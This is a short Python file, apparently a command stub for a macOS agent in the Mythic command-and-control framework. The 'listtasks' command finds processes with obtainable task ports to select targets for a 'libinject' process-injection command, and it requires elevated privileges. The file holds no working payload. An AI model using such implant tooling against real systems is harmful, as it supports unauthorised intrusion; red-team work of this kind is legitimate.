from CommandBase import *
import json


class ListtasksArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class ListtasksCommand(CommandBase):
    cmd = "listtasks"
    needs_admin = True
    help_cmd = "listtasks"
    description = "Obtain a list of processes with obtainable task ports on macOS. This command should be used to determine target processes for the libinject command"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@xorrior"
    argument_class = ListtasksArguments
    attackmapping = ["T1057"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if task.callback.integrity_level <= 2:
            raise Exception("Error: the listtasks command requires elevated privileges")
        else:
            return task

    async def process_response(self, response: AgentResponse):
        pass
